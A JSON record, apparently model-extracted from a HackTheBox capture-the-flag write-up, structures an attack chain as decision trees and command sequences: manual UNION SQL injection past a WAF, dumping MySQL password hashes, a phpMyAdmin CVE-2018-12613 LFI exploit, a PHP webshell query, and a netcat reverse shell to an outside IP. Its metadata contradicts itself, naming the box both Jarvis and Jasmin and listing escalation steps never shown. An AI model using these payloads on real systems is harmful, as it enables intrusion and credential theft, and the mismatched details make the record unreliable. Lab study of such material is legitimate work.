@@ -1,0 +1,877 @@
+{
+  "writeup_id": "Htb_Jarvis",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_sqli_to_privilege_escalation",
+    "primary_services": [
+      "http",
+      "ssh",
+      "phpmyadmin"
+    ],
+    "port_signature": "22+80+64999",
+    "service_combination": "ssh+apache+custom_waf",
+    "os_family": "linux_debian",
+    "environment_type": "web_application",
+    "entry_vector": "sql_injection_waf_bypass",
+    "privilege_path": "sqli_to_command_injection_to_service_abuse",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "custom_waf_blocking_sqlmap",
+      "manual_sqli_required",
+      "phpmyadmin_present",
+      "python_command_injection",
+      "service_creation_privesc"
+    ],
+    "environmental_clues": [
+      "ironwaf_header_present",
+      "get_parameter_sqli",
+      "debian_apache_stack",
+      "timeout_ban_mechanism"
+    ],
+    "similar_scenarios": [
+      "holiday_htb_easy",
+      "nineveh_htb_medium"
+    ],
+    "unique_aspects": [
+      "ironwaf_2_0_3",
+      "90_second_ban_system",
+      "dual_http_ports",
+      "stark_hotel_theme"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SQL_Injection_WAF_Bypass",
+        "success_reason": "Manual UNION-based injection bypassed IronWAF 2.0.3 where sqlmap failed",
+        "prerequisite_indicators": [
+          "parameter_accepts_user_input",
+          "database_errors_visible",
+          "waf_present_but_bypassable"
+        ],
+        "recognition_patterns": [
+          "page content changes with single quote",
+          "sqlmap fails with WAF detection",
+          "manual payloads work where automated tools fail"
+        ],
+        "failure_modes": [
+          "sqlmap_blocked_by_waf",
+          "automated_tools_trigger_rate_limiting",
+          "ip_banned_for_90_seconds"
+        ],
+        "environmental_factors": [
+          "custom_waf_implementation",
+          "rate_limiting_mechanism",
+          "legacy_php_application"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "UNION_Based_SQLi",
+        "success_reason": "7-column UNION injection revealed database structure and credentials",
+        "prerequisite_indicators": [
+          "union_select_works",
+          "column_count_determinable",
+          "output_reflected_in_response"
+        ],
+        "recognition_patterns": [
+          "testing cod=100 UNION SELECT 1,2,3...",
+          "page populates with injected data",
+          "column positions map to page elements"
+        ],
+        "failure_modes": [
+          "incorrect_column_count",
+          "no_output_reflection",
+          "waf_blocks_union_keyword"
+        ],
+        "environmental_factors": [
+          "mysql_database_backend",
+          "information_schema_accessible",
+          "group_concat_function_available"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "room.php parameter cod vulnerable to SQLi",
+        "discovery_method": "Manual testing with single quote injection",
+        "why_critical": "Led to database enumeration and credential extraction",
+        "how_to_recognize": [
+          "GET parameter in URL",
+          "page content changes with quote",
+          "no proper input sanitization"
+        ],
+        "follow_up_actions": [
+          "determine_column_count",
+          "enumerate_database_structure",
+          "extract_mysql_user_table"
+        ]
+      },
+      {
+        "discovery": "IronWAF 2.0.3 blocks automated tools",
+        "discovery_method": "sqlmap failure and HTTP header analysis",
+        "why_critical": "Required manual exploitation approach",
+        "how_to_recognize": [
+          "IronWAF header in HTTP response",
+          "sqlmap fails with WAF detection",
+          "90-second ban message on port 64999"
+        ],
+        "follow_up_actions": [
+          "switch_to_manual_techniques",
+          "avoid_automated_scanners",
+          "use_waf_evasion_techniques"
+        ]
+      },
+      {
+        "discovery": "PHPMyAdmin directory accessible",
+        "discovery_method": "Directory enumeration with gobuster",
+        "why_critical": "Potential alternative access path with database credentials",
+        "how_to_recognize": [
+          "common_directory_name",
+          "mysql_database_present",
+          "web_application_uses_php"
+        ],
+        "follow_up_actions": [
+          "extract_database_credentials",
+          "attempt_phpmyadmin_login",
+          "look_for_file_upload_capabilities"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated_web",
+        "escalation_method": "SQLi_to_credential_extraction",
+        "why_possible": "UNION injection allowed access to mysql.user table",
+        "recognition_signs": [
+          "information_schema_accessible",
+          "mysql_database_readable",
+          "group_concat_function_works"
+        ],
+        "exploitation_path": "SQLi → mysql.user enumeration → credential extraction → PHPMyAdmin access"
+      },
+      {
+        "privilege_level": "database_access",
+        "escalation_method": "file_upload_via_phpmyadmin",
+        "why_possible": "Database credentials provide PHPMyAdmin access for potential file upload",
+        "recognition_signs": [
+          "phpmyadmin_directory_exists",
+          "valid_database_credentials",
+          "file_upload_functionality_available"
+        ],
+        "exploitation_path": "Database creds → PHPMyAdmin login → SQL file upload → web shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80,64999 open on Linux host with Apache",
+        "decision": "Enumerate web applications and look for injection vulnerabilities",
+        "reasoning": "Multiple HTTP ports suggest web-focused attack surface with potential for injection",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web attacks fail"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if known CVEs exist"
+          }
+        ],
+        "success_indicators": [
+          "parameter_injection_found",
+          "error_messages_revealed",
+          "waf_detection_triggered"
+        ],
+        "next_decision": "choose_injection_bypass_method"
+      },
+      {
+        "step": 2,
+        "situation": "SQL injection found but WAF blocking automated tools",
+        "decision": "Perform manual SQL injection to bypass WAF",
+        "reasoning": "WAF detected and blocking sqlmap, manual techniques needed",
+        "confidence": 0.85,
+        "prerequisites": [
+          "injection_parameter_identified",
+          "waf_behavior_understood"
+        ],
+        "success_indicators": [
+          "union_injection_successful",
+          "database_enumeration_working"
+        ],
+        "failure_fallbacks": [
+          "waf_evasion_techniques",
+          "alternative_injection_points"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Database credentials extracted via SQL injection",
+        "decision": "Access PHPMyAdmin with extracted credentials",
+        "reasoning": "Database admin credentials provide direct access to management interface",
+        "confidence": 0.95,
+        "prerequisites": [
+          "database_credentials_obtained",
+          "phpmyadmin_accessible"
+        ],
+        "success_indicators": [
+          "phpmyadmin_login_successful",
+          "version_information_revealed"
+        ],
+        "failure_fallbacks": [
+          "credential_reuse_testing",
+          "direct_database_connection"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "PHPMyAdmin 4.8.0 access obtained",
+        "decision": "Exploit CVE-2018-12613 for RCE",
+        "reasoning": "Known LFI to RCE vulnerability in this specific version",
+        "confidence": 0.9,
+        "prerequisites": [
+          "phpmyadmin_version_4.8.0",
+          "admin_access_confirmed"
+        ],
+        "success_indicators": [
+          "lfi_successful",
+          "code_execution_achieved"
+        ],
+        "failure_fallbacks": [
+          "sql_file_upload",
+          "into_outfile_technique"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_waf_detected": {
+        "action": "switch_to_manual_exploitation",
+        "tools": [
+          "burp_suite",
+          "manual_payloads"
+        ],
+        "next_phase": "bypass_waf_restrictions"
+      },
+      "if_sql_injection_succeeds": {
+        "action": "enumerate_database_for_credentials",
+        "targets": [
+          "mysql.user_table",
+          "application_config_tables"
+        ],
+        "next_phase": "credential_reuse_testing"
+      },
+      "if_phpmyadmin_accessible": {
+        "action": "check_version_for_known_exploits",
+        "priority_cves": [
+          "CVE-2018-12613"
+        ],
+        "next_phase": "exploit_management_interface"
+      },
+      "if_rce_achieved": {
+        "action": "establish_reverse_shell",
+        "tools": [
+          "netcat",
+          "python_reverse_shell"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_try_manual_injection_when_waf_detected",
+        "reasoning": "automated_tools_often_blocked_by_waf",
+        "applicability": "waf_protection_identified"
+      },
+      {
+        "rule": "prioritize_database_credential_extraction",
+        "reasoning": "database_access_often_leads_to_admin_interfaces",
+        "applicability": "sql_injection_confirmed"
+      },
+      {
+        "rule": "check_phpmyadmin_version_immediately_after_access",
+        "reasoning": "version_specific_exploits_available",
+        "applicability": "phpmyadmin_access_obtained"
+      },
+      {
+        "rule": "use_group_concat_for_efficient_data_extraction",
+        "reasoning": "reduces_number_of_requests_and_waf_triggers",
+        "applicability": "union_based_sql_injection"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SQL Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "mysql"
+        ],
+        "required_ports": [
+          80,
+          443,
+          3306
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_with_database",
+          "user_input_parameters",
+          "dynamic_content_generation"
+        ],
+        "success_indicators": [
+          "error_messages_on_quote_injection",
+          "content_changes_with_malformed_input",
+          "database_error_disclosure"
+        ],
+        "incompatible_with": [
+          "prepared_statements_only",
+          "strict_input_validation",
+          "aggressive_waf_blocking"
+        ],
+        "confidence_boosters": [
+          "php_extensions_detected",
+          "phpmyadmin_directory_found",
+          "mysql_default_ports_open"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "WAF Bypass",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "waf_protection_detected",
+          "custom_or_weak_waf_rules",
+          "alternative_encoding_accepted"
+        ],
+        "success_indicators": [
+          "waf_version_in_headers",
+          "blocking_messages_displayed",
+          "timeout_based_blocking"
+        ],
+        "incompatible_with": [
+          "enterprise_waf_solutions",
+          "ml_based_detection",
+          "complete_request_blocking"
+        ],
+        "confidence_boosters": [
+          "custom_waf_names",
+          "predictable_blocking_patterns",
+          "bypass_techniques_available"
+        ],
+        "typical_success_rate": 0.6,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Command Injection",
+        "mitre_id": "T1059",
+        "required_services": [
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "user_input_to_system_commands",
+          "insufficient_input_sanitization",
+          "script_execution_capabilities"
+        ],
+        "success_indicators": [
+          "system_command_execution",
+          "file_system_access",
+          "network_connectivity_from_target"
+        ],
+        "incompatible_with": [
+          "strict_command_filtering",
+          "sandboxed_execution",
+          "disabled_system_functions"
+        ],
+        "confidence_boosters": [
+          "python_script_execution",
+          "file_upload_functionality",
+          "admin_panel_access"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "5-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443,
+          64999
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "PHP",
+          "Server"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "database_backend": {
+        "port_indicators": [
+          3306,
+          5432,
+          1433
+        ],
+        "service_indicators": [
+          "mysql",
+          "postgresql",
+          "mssql"
+        ],
+        "technology_indicators": [
+          "phpmyadmin",
+          "php",
+          "database"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "waf_protection": {
+        "header_indicators": [
+          "IronWAF",
+          "WAF",
+          "Security"
+        ],
+        "response_indicators": [
+          "banned",
+          "blocked",
+          "suspicious"
+        ],
+        "behavior_indicators": [
+          "timeout_blocking",
+          "request_filtering"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "sql_injection_manual",
+          "when": "database_parameters_detected",
+          "reason": "direct_database_access_possible"
+        },
+        {
+          "attack": "waf_bypass_techniques",
+          "when": "waf_blocking_detected",
+          "reason": "enables_other_attack_vectors"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_enumeration",
+          "when": "web_service_detected",
+          "reason": "reveals_admin_interfaces"
+        },
+        {
+          "attack": "command_injection_testing",
+          "when": "script_execution_suspected",
+          "reason": "high_impact_if_successful"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "SQL Injection with WAF Bypass",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "sqlmap",
+            "command_template": "sqlmap -u {url} --random-agent --level 1 --risk 1 --batch",
+            "actual_command": "sqlmap -u http://10.10.10.143:80/room.php?cod=1 --random-agent --level 1 --risk 1 --batch",
+            "output_pattern": "GET parameter 'cod' appears to be injectable",
+            "effectiveness_rating": 3,
+            "reliability": 0.65,
+            "waf_bypass_options": [
+              "--random-agent",
+              "--level 1",
+              "--risk 1"
+            ]
+          },
+          {
+            "name": "manual_union_injection",
+            "command_template": "{base_url}?cod=100 UNION SELECT {columns};-- -",
+            "actual_command": "http://10.10.10.143/room.php?cod=100 UNION SELECT 1,2,3,4,5,6,7;-- -",
+            "output_pattern": "populated page content",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "vulnerable_parameter_identified",
+          "union_column_count_determined",
+          "waf_bypass_techniques_applied"
+        ],
+        "success_indicators": [
+          "database_enumeration_successful",
+          "credentials_extracted",
+          "error_messages_reveal_structure"
+        ],
+        "common_failures": [
+          "waf_blocking_requests",
+          "90_second_ip_ban_triggered",
+          "incorrect_column_count"
+        ],
+        "follow_up_techniques": [
+          "credential_extraction",
+          "phpmyadmin_access",
+          "file_inclusion_exploitation"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "PHPMyAdmin RCE via LFI",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "phpmyadmin_lfi",
+            "command_template": "{phpmyadmin_url}/index.php?target=db_sql.php%3f/{lfi_path}",
+            "actual_command": "http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../etc/passwd",
+            "output_pattern": "file contents displayed",
+            "effectiveness_rating": 5,
+            "reliability": 0.98,
+            "cve": "CVE-2018-12613"
+          },
+          {
+            "name": "sql_webshell_injection",
+            "command_template": "SELECT '<?php system($_GET[\"cmd\"]);?>'",
+            "actual_command": "SELECT '<?php system($_GET[\"cmd\"]);?>'",
+            "output_pattern": "query executed successfully",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "phpmyadmin_credentials_obtained",
+          "phpmyadmin_version_4.8.0_confirmed",
+          "valid_session_cookie_available"
+        ],
+        "success_indicators": [
+          "lfi_reads_system_files",
+          "php_code_execution_confirmed",
+          "reverse_shell_established"
+        ],
+        "common_failures": [
+          "session_cookie_expired",
+          "incorrect_session_path",
+          "php_execution_disabled"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_upgrade",
+          "privilege_escalation_enumeration",
+          "lateral_movement"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Database Credential Extraction",
+        "mitre_id": "T1555.001",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "union_injection_enumeration",
+            "command_template": "SELECT 1, group_concat({column_name}), 3, 4, 5, 6, 7 from {table};-- -",
+            "actual_command": "SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -",
+            "output_pattern": "DBadmin 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "hash_cracking",
+            "command_template": "online hash lookup or hashcat",
+            "actual_command": "hashes.org lookup",
+            "output_pattern": "MYSQL5 hash:imissyou",
+            "effectiveness_rating": 4,
+            "reliability": 0.75
+          }
+        ],
+        "prerequisites": [
+          "sql_injection_confirmed",
+          "mysql_database_access",
+          "union_injection_working"
+        ],
+        "success_indicators": [
+          "mysql_user_table_accessible",
+          "password_hashes_extracted",
+          "hashes_successfully_cracked"
+        ],
+        "common_failures": [
+          "insufficient_database_privileges",
+          "strong_password_hashes",
+          "waf_blocking_enumeration"
+        ],
+        "follow_up_techniques": [
+          "phpmyadmin_authentication",
+          "database_privilege_escalation",
+          "credential_reuse_testing"
+        ],
+        "time_investment": "20-30 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "sqlmap",
+        "use_case": "automated_sql_injection_with_waf",
+        "effectiveness_rating": 3,
+        "reliability": 0.65,
+        "learning_curve": "low",
+        "essential_for": [
+          "automated_sqli_testing"
+        ],
+        "alternatives": [
+          "manual_injection",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "use_random_agent_against_wafs",
+          "start_with_low_level_and_risk",
+          "have_manual_backup_plan"
+        ]
+      },
+      {
+        "tool": "manual_union_injection",
+        "use_case": "waf_bypass_and_precise_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "medium",
+        "essential_for": [
+          "waf_protected_applications"
+        ],
+        "alternatives": [
+          "sqlmap_with_tamper_scripts"
+        ],
+        "best_practices": [
+          "determine_column_count_first",
+          "use_group_concat_for_multiple_rows",
+          "test_different_injection_points"
+        ]
+      },
+      {
+        "tool": "phpmyadmin_lfi_exploit",
+        "use_case": "rce_via_session_poisoning",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "medium",
+        "essential_for": [
+          "phpmyadmin_4.8.0_exploitation"
+        ],
+        "alternatives": [
+          "direct_file_upload",
+          "other_lfi_techniques"
+        ],
+        "best_practices": [
+          "poison_session_with_php_code_first",
+          "use_correct_session_path",
+          "validate_lfi_with_system_files"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "sqli_to_phpmyadmin_rce",
+        "steps": [
+          {
+            "step": 1,
+            "command": "http://10.10.10.143/room.php?cod=100 UNION SELECT 1,2,3,4,5,6,7;-- -",
+            "purpose": "Determine union injection column count",
+            "expected_output": "Page populates with injected data"
+          },
+          {
+            "step": 2,
+            "command": "SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -",
+            "purpose": "Enumerate available databases",
+            "expected_output": "hotel,information_schema,mysql,performance_schema"
+          },
+          {
+            "step": 3,
+            "command": "SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -",
+            "purpose": "Extract MySQL credentials",
+            "expected_output": "DBadmin 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0"
+          },
+          {
+            "step": 4,
+            "command": "Login to PHPMyAdmin with DBadmin:imissyou",
+            "purpose": "Access database administration interface",
+            "expected_output": "Successful PHPMyAdmin login"
+          },
+          {
+            "step": 5,
+            "command": "SELECT '<?php system($_GET[\"cmd\"]);?>'",
+            "purpose": "Poison session with PHP code",
+            "expected_output": "SQL query executed successfully"
+          },
+          {
+            "step": 6,
+            "command": "http://10.10.10.143/phpmyadmin/index.php?cmd=nc -e /bin/sh 10.10.14.8 443&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_[SESSION_ID]",
+            "purpose": "Execute reverse shell via LFI",
+            "expected_output": "Reverse shell connection established"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "30-60 minutes"
+      },
+      {
+        "sequence_name": "waf_bypass_enumeration",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Test basic injection: room.php?cod=1'",
+            "purpose": "Confirm SQL injection vulnerability",
+            "expected_output": "Page behavior changes or errors"
+          },
+          {
+            "step": 2,
+            "command": "sqlmap -u http://10.10.10.143:80/room.php?cod=1 --random-agent --level 1 --risk 1 --batch",
+            "purpose": "Attempt automated exploitation with WAF bypass",
+            "expected_output": "Injection confirmed or WAF blocking detected"
+          },
+          {
+            "step": 3,
+            "command": "Manual union injection with incremental column testing",
+            "purpose": "Bypass WAF with manual techniques",
+            "expected_output": "Successful data extraction"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "15-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Jasmin",
+      "difficulty": "Medium",
+      "os": "Linux (Debian 9)",
+      "platform": "HackTheBox",
+      "release_date": "2019-06-22",
+      "author": "manulqwerty & Ghostpp7",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "sql_injection",
+        "command_injection",
+        "privilege_escalation"
+      ],
+      "key_vulnerabilities": [
+        "waf_bypass",
+        "python_script_injection",
+        "malicious_service_creation"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "waf_evasion",
+        "manual_sqli",
+        "service_exploitation"
+      ],
+      "prerequisite_knowledge": [
+        "sql_injection_basics",
+        "linux_privilege_escalation",
+        "python_scripting"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "sql_injection",
+        "command_injection",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "execution",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "proper_waf_configuration",
+        "input_validation",
+        "service_hardening"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Nineveh",
+        "Popcorn",
+        "Beep"
+      ],
+      "similarity_reasons": [
+        "web_exploitation",
+        "multi_step_privilege_escalation",
+        "service_manipulation"
+      ],
+      "unique_aspects": [
+        "waf_bypass_techniques",
+        "python_script_exploitation",
+        "sqlmap_evasion"
+      ],
+      "difficulty_factors": [
+        "waf_interference",
+        "manual_exploitation_required",
+        "service_creation_complexity"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T14:22:18.795194",
+    "original_file": "0xdf_writeups/Htb Jasmin.md",
+    "content_length": 41761,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
